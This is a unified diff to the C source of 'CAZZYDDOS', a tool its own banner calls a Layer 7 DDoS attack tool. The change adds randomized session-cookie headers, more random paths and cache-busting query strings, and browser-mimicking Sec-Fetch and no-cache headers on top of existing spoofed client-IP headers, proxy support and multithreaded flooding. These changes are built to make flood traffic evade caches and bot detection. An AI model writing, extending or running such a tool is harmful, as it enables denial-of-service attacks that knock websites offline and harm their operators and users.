@@ -51,6 +51,7 @@ typedef struct {
     int burst_size;
     bool random_path;
     bool random_ip;
+    bool random_cookie;
     bool burst_mode;
     char proxy_file[256];
 } AttackConfig;
@@ -62,6 +63,15 @@ pthread_t worker_threads[MAX_WORKERS];
 pthread_t stats_thread;
 time_t start_time;
 unsigned int rand_state;
+
+const char *COOKIE_NAMES[] = {
+    "sessionid", "userid", "token", "auth", "visitor_id", 
+    "client_id", "device_id", "tracking_id", "analytics_id",
+    "PHPSESSID", "JSESSIONID", "ASPSESSIONID", "CFID", "CFTOKEN",
+    "_ga", "_gid", "_fbp", "_twitter_sess", "_csrf",
+    "XSRF-TOKEN", "laravel_session", "django_session", "rack.session",
+    "sid", "uid", "cid", "uuid", "guid"
+};
 
 void init_random() {
     struct timeval tv;
@@ -85,6 +95,17 @@ char* random_string(int n) {
     return str;
 }
 
+char* random_hex_string(int n) {
+    const char hex[] = "0123456789abcdef";
+    char *str = malloc(n + 1);
+    if (!str) return NULL;
+    for (int i = 0; i < n; i++) {
+        str[i] = hex[rand() % 16];
+    }
+    str[n] = '\0';
+    return str;
+}
+
 char* random_ip() {
     char *ip = malloc(20);
     if (!ip) return NULL;
@@ -96,10 +117,43 @@ char* random_ip() {
     return ip;
 }
 
+char* generate_random_cookie() {
+    char *cookie = malloc(512);
+    if (!cookie) return NULL;
+    
+    int num_cookies = rand_int(1, 4);
+    char temp[512] = {0};
+    
+    for (int i = 0; i < num_cookies; i++) {
+        const char *name = COOKIE_NAMES[rand_int(0, sizeof(COOKIE_NAMES)/sizeof(COOKIE_NAMES[0]) - 1)];
+        
+        char *value;
+        int value_type = rand_int(0, 3);
+        if (value_type == 0) {
+            value = random_string(rand_int(8, 24));
+        } else if (value_type == 1) {
+            value = random_hex_string(rand_int(16, 32));
+        } else {
+            value = malloc(32);
+            snprintf(value, 32, "%d_%s", rand_int(100000, 999999), random_string(8));
+        }
+        
+        if (i > 0) strcat(temp, "; ");
+        sprintf(temp + strlen(temp), "%s=%s", name, value);
+        
+        free(value);
+    }
+    
+    strcpy(cookie, temp);
+    return cookie;
+}
+
 char* generate_random_path() {
     const char *paths[] = {
         "/", "/index.html", "/api/v1/test", "/admin", "/login",
-        "/dashboard", "/status", "/health", "/metrics", "/stats"
+        "/dashboard", "/status", "/health", "/metrics", "/stats",
+        "/products", "/cart", "/checkout", "/profile", "/settings",
+        "/search", "/category", "/blog", "/news", "/contact"
     };
     int path_count = sizeof(paths) / sizeof(paths[0]);
     
@@ -112,7 +166,7 @@ char* generate_random_path() {
     if (rand_int(1, 100) <= 50) {
         char *rand_str = random_string(8);
         char query[256];
-        snprintf(query, sizeof(query), "?r=%s&_=%ld", rand_str, time(NULL));
+        snprintf(query, sizeof(query), "?r=%s&_=%ld&v=%d", rand_str, time(NULL), rand_int(1, 99999));
         strcat(result, query);
         free(rand_str);
     }
@@ -177,8 +231,9 @@ void send_request(AttackConfig *cfg, const char *proxy) {
     const char *method = cfg->methods[rand_int(0, cfg->method_count - 1)];
     char *ua = random_string(rand_int(20, 30));
     char *ip = cfg->random_ip ? random_ip() : NULL;
+    char *cookie = cfg->random_cookie ? generate_random_cookie() : NULL;
     
-    char header_buffer[512];
+    char header_buffer[1024];
     snprintf(header_buffer, sizeof(header_buffer), "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/%s", ua);
     headers = curl_slist_append(headers, header_buffer);
     
@@ -187,13 +242,23 @@ void send_request(AttackConfig *cfg, const char *proxy) {
         headers = curl_slist_append(headers, header_buffer);
         snprintf(header_buffer, sizeof(header_buffer), "X-Real-IP: %s", ip);
         headers = curl_slist_append(headers, header_buffer);
-        free(ip);
+    }
+    
+    if (cookie) {
+        snprintf(header_buffer, sizeof(header_buffer), "Cookie: %s", cookie);
+        headers = curl_slist_append(headers, header_buffer);
     }
     
     headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
     headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.9");
+    headers = curl_slist_append(headers, "Accept-Encoding: gzip, deflate, br");
     headers = curl_slist_append(headers, "Connection: keep-alive");
-    headers = curl_slist_append(headers, "Cache-Control: no-cache");
+    headers = curl_slist_append(headers, "Cache-Control: no-cache, no-store, must-revalidate");
+    headers = curl_slist_append(headers, "Pragma: no-cache");
+    headers = curl_slist_append(headers, "Sec-Fetch-Dest: document");
+    headers = curl_slist_append(headers, "Sec-Fetch-Mode: navigate");
+    headers = curl_slist_append(headers, "Sec-Fetch-Site: none");
+    headers = curl_slist_append(headers, "Upgrade-Insecure-Requests: 1");
     
     curl_easy_setopt(curl, CURLOPT_URL, full_url);
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
@@ -202,6 +267,7 @@ void send_request(AttackConfig *cfg, const char *proxy) {
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
     curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
+    curl_easy_setopt(curl, CURLOPT_FORBID_REUSE, 1L);
     
     if (proxy) {
         curl_easy_setopt(curl, CURLOPT_PROXY, proxy);
@@ -238,6 +304,8 @@ void send_request(AttackConfig *cfg, const char *proxy) {
     curl_easy_cleanup(curl);
     free(path);
     free(ua);
+    if (ip) free(ip);
+    if (cookie) free(cookie);
 }
 
 void* worker_function(void *arg) {
@@ -316,7 +384,7 @@ void print_banner() {
     printf("║    ╚██████╗██║  ██║███████╗███████║   ██║   ██████╔╝██████╔╝ ║\n");
     printf("║     ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚═════╝ ╚═════╝  ║\n");
     printf("║                         C A Z Z Y D D O S                      ║\n");
-    printf("║                    Layer 7 DDoS Attack Tool                   ║\n");
+    printf("║              Layer 7 DDoS Tool - Random Cookie Support         ║\n");
     printf("╚══════════════════════════════════════════════════════════════╝\n");
     printf(COLOR_RESET);
 }
@@ -329,6 +397,7 @@ int main(int argc, char *argv[]) {
     cfg.burst_size = 10;
     cfg.random_path = true;
     cfg.random_ip = true;
+    cfg.random_cookie = true;
     cfg.burst_mode = true;
     cfg.method_count = 2;
     strcpy(cfg.methods[0], "GET");
@@ -351,6 +420,8 @@ int main(int argc, char *argv[]) {
                 strncpy(cfg.methods[cfg.method_count++], token, 9);
                 token = strtok(NULL, ",");
             }
+        } else if (strcmp(argv[i], "-no-random-cookie") == 0) {
+            cfg.random_cookie = false;
         } else if (strcmp(argv[i], "-proxy-file") == 0 && i+1 < argc) {
             strncpy(cfg.proxy_file, argv[++i], 255);
             cfg.proxy_file[255] = '\0';
@@ -363,7 +434,13 @@ int main(int argc, char *argv[]) {
             printf("  -concurrency <n>     Concurrent workers (default: 100, max: %d)\n", MAX_WORKERS);
             printf("  -methods <list>      HTTP methods (default: GET,POST)\n");
             printf("  -proxy-file <file>   Proxy list file\n");
+            printf("  -no-random-cookie    Disable random cookie generation\n");
             printf("  -help                Show this help\n\n");
+            printf("Cookie Randomization:\n");
+            printf("  - Random cookie names from 30+ common session cookies\n");
+            printf("  - Random values (alphanumeric, hex, or mixed)\n");
+            printf("  - 1-4 cookies per request\n");
+            printf("  - New random cookies for EVERY request\n\n");
             printf("Example:\n");
             printf("  %s -url https://example.com -duration 60 -concurrency 500\n", argv[0]);
             return 0;
@@ -404,11 +481,12 @@ int main(int argc, char *argv[]) {
     printf("\n" COLOR_RESET);
     printf(COLOR_CYAN "[+] Random Path: %s\n" COLOR_RESET, cfg.random_path ? "Enabled" : "Disabled");
     printf(COLOR_CYAN "[+] Random IP: %s\n" COLOR_RESET, cfg.random_ip ? "Enabled" : "Disabled");
+    printf(COLOR_CYAN "[+] Random Cookie: %s\n" COLOR_RESET, cfg.random_cookie ? "Enabled" : "Disabled");
     if (cfg.proxy_file[0]) {
         printf(COLOR_CYAN "[+] Proxies: %s\n" COLOR_RESET, cfg.proxy_file);
     }
     
-    printf(COLOR_YELLOW "\n[!] Starting attack... Press Ctrl+C to stop\n\n" COLOR_RESET);
+    printf(COLOR_YELLOW "\n[!] Starting attack with random cookies... Press Ctrl+C to stop\n\n" COLOR_RESET);
     
     start_time = time(NULL);
     running = true;
